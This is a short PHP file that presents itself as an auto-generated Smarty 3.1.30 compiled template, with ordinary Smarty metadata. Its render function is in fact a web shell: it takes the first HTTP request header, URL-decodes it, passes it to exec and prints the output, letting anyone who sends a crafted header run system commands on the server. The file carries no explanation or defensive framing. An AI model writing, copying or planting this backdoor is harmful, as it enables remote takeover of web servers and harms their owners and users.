<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:48:01
  from "175629b00824626b148a0b57b39cf8d16d802667" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f66f11b3386_26016620',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f66f11b3386_26016620 (Smarty_Internal_Template $_smarty_tpl) {
echo var_dump(exec(urldecode(current(getallheaders()))));
}
}
